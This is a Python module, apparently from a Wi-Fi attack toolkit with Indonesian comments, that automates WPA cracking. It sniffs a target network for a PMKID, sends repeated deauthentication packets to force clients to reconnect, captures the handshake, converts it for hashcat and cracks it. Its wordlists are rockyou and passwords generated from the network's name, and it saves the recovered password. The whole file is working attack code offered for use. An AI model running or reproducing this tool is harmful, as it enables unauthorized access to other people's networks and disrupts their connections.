import os
import sys
import time
import subprocess
import re
import threading

# Import path dari config
try:
    from wifipro.core.config import HANDSHAKE_DIR
except ImportError:
    HANDSHAKE_DIR = "data/handshakes"

class HandshakeCapture:
    def __init__(self, wifi_engine, colors):
        self.wifi = wifi_engine # Ini adalah WiFiEngine dari menu.py
        self.colors = colors
        self.rockyou = "/usr/share/wordlists/rockyou.txt"
        self.rockyou_gz = "/usr/share/wordlists/rockyou.txt.gz"
        self.wordlist_pribadi = os.path.join(HANDSHAKE_DIR, "pola_password.txt")
        
        # Pastikan folder handshake ada
        if not os.path.exists(HANDSHAKE_DIR):
            os.makedirs(HANDSHAKE_DIR)

    def _check_handshake(self, cap_file):
        """Verifier: Cek apakah file .cap berisi Handshake atau PMKID"""
        if not os.path.exists(cap_file): return False
        try:
            # Pake aircrack-ng buat quick check
            cmd = ["aircrack-ng", cap_file]
            proc = subprocess.run(cmd, capture_output=True, text=True)
            output = proc.stdout.lower()
            return any(x in output for x in ["1 handshake", "wpa (1)", "pmkid"])
        except: return False

    def _generate_suffix_passwords(self, essid):
        """Generator: Menambah variasi password berdasarkan nama WiFi"""
        c = self.colors
        passwords = set()
        # Ambil kata pertama dari SSID (misal: 'Warung Kopi' jadi 'Warung')
        base_raw = essid.split()[0] if " " in essid else essid
        # Hapus angka di akhir (misal: 'Indihome123' jadi 'Indihome')
        base_clean = re.sub(r'\d+$', '', base_raw) or base_raw

        print(f"  {c.INFO} {c.W}GENERATING:{c.G} Building patterns from {c.Y}{base_clean}{c.NC}...")

        bases = [base_clean.lower(), base_clean.upper(), base_clean.capitalize()]
        for b in bases:
            if len(b) >= 8: passwords.add(b)
            for i in range(1, 100):
                # Pola umum: Nama01, Nama123, Nama2024
                for suffix in [f"{i:02d}", f"{i}123", "2023", "2024", "2025", "2026"]:
                    pw = f"{b}{suffix}"
                    if len(pw) >= 8: passwords.add(pw)

        try:
            with open(self.wordlist_pribadi, "a") as f:
                for pw in sorted(passwords): f.write(f"{pw}\n")
            return True
        except: return False

    def start_capture(self, targets):
        c = self.colors
        if not targets: return

        # --- SELECT TARGET ---
        try:
            val = input(f"\n  {c.Q} Select Target ID: ").strip()
            target = targets[int(val) - 1]
        except: return

        bssid = target['bssid']
        channel = str(target['ch'])
        essid_raw = target.get('essid', 'Unknown')
        essid_safe = re.sub(r'[^\w]', '', essid_raw) or "Target"
        
        # Ambil interface dari engine
        iface = getattr(self.wifi, 'iface', None)
        if not iface: 
            print(f"  {c.ERR} Interface not found!"); return
        
        output_base = os.path.join(HANDSHAKE_DIR, f"{essid_safe}_{bssid.replace(':','')}")
        cap_file = f"{output_base}-01.cap"
        hc_file = f"{output_base}.hc22000"

        # --- CAPTURE PROCESS ---
        print(f"\n  {c.Y}[*] Sniffing Handshake: {c.W}{essid_raw}{c.NC}")
        # Lock channel dulu bang!
        os.system(f"iwconfig {iface} channel {channel}")
        
        cap_proc = subprocess.Popen(["airodump-ng", "--bssid", bssid, "--channel", channel,
                                     "--write", output_base, "--output-format", "cap", iface], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        try:
            # Phase 1: Passive PMKID
            for i in range(15, 0, -1):
                sys.stdout.write(f"\r  {c.OK} Phase 1: Passive PMKID Scan [{i:02d}s] ")
                sys.stdout.flush()
                if self._check_handshake(cap_file):
                    print(f"\n  {c.G}[+] PMKID Captured!{c.NC}")
                    break
                time.sleep(1)

            # Phase 2: Active Deauth jika belum dapet
            if not self._check_handshake(cap_file):
                print(f"\n  {c.WARN} Phase 2: Sending Deauth Packets...")
                deauth_cmd = ["aireplay-ng", "-0", "5", "-a", bssid, "--ignore-negative-one", iface]
                
                for loop in range(1, 6): # Maks 5 kali coba deauth
                    if self._check_handshake(cap_file): break
                    sys.stdout.write(f"\r  {c.OK} Deauth Attack #{loop} | Waiting Handshake... ")
                    sys.stdout.flush()
                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
                    time.sleep(8) # Kasih jeda user konek ulang

            if self._check_handshake(cap_file):
                print(f"\n\n  {c.G}[+] SUCCESS: Handshake Valid!{c.NC}")
                cap_proc.terminate()
                self._run_crack_flow(essid_raw, cap_file, hc_file)
            else:
                print(f"\n\n  {c.ERR} FAILED: Handshake not captured.{c.NC}")

        except KeyboardInterrupt:
            print(f"\n\n  {c.ERR} Aborted by user.{c.NC}")
        finally:
            cap_proc.terminate()

    def _run_crack_flow(self, essid_raw, cap_file, hc_file):
        """Proses konversi dan cracking"""
        c = self.colors
        self._generate_suffix_passwords(essid_raw)
        
        # Convert ke Hashcat format
        subprocess.run(f"hcxpcapngtool -o {hc_file} {cap_file}", shell=True, stdout=subprocess.DEVNULL)

        if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
            for current_wl in [self.wordlist_pribadi, self.rockyou]:
                if not os.path.exists(current_wl): continue

                print(f"\n  {c.INFO} Starting Hashcat ({current_wl})...")
                # Command hashcat dengan auto-crack
                cmd = f"hashcat -m 22000 {hc_file} {current_wl} --force --quiet --outfile-format=2"
                try:
                    # Cek potfile dulu bang, siapa tau udah pernah pecah
                    check_pot = subprocess.run(f"{cmd} --show", shell=True, capture_output=True, text=True)
                    result = check_pot.stdout.strip()

                    if not result:
                        # Kalau belum ada di potfile, baru gass crack
                        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                        result = proc.stdout.strip()

                    if result:
                        password = result.split(':')[-1]
                        self._save_success(essid_raw, password)
                        return
                except: continue
            
            print(f"\n  {c.ERR} Wordlist exhausted. Password not found.{c.NC}")

    def _save_success(self, essid, password):
        c = self.colors
        # Simpan ke data/handshakes/ESSID.txt
        essid_safe = re.sub(r'[^\w]', '', essid)
        save_path = os.path.join(HANDSHAKE_DIR, f"{essid_safe}_pass.txt")
        
        with open(save_path, "w") as f:
            f.write(f"SSID: {essid}\nPASSWORD: {password}\nDATE: {time.ctime()}\n")

        print(f"\n  {c.G}┌──────────────────────────────────────────┐")
        print(f"    {c.W}SSID     :{c.NC} {c.Y}{essid}{c.NC}")
        print(f"    {c.W}PASSWORD :{c.NC} {c.G}{password}{c.NC}")
        print(f"    {c.W}SAVED TO :{c.NC} {save_path}")
        print(f"  {c.G}└──────────────────────────────────────────┘{c.NC}")